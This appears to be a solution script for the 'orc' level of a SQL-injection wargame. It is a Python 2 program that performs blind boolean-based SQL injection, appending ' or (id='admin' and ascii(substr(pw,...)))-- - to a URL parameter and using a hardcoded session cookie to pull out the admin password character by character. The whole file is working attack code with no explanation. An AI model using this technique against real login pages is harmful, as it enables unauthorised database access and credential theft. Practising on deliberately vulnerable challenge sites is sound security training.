#!/usr/bin/python
import requests
import re

cookie = {'PHPSESSID': 'c32vdp4p7i22qdbtkok49toa10'}

url = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=-1'"

cmp = "Hello admin"

dbname=""

#Password is
for i in range(1, 10):
    for j in range(40, 125):
        query = url + " or (id='admin' and ascii(substr(pw," + str(i) + ",1))=" + str(j) + ")-- -"
        req = requests.get(query, cookies=cookie)
        res=req.text
        tmp = re.findall(cmp, res)
        if tmp:
            dbname += chr(j)
            break
print "Password is : " + dbname
    
    





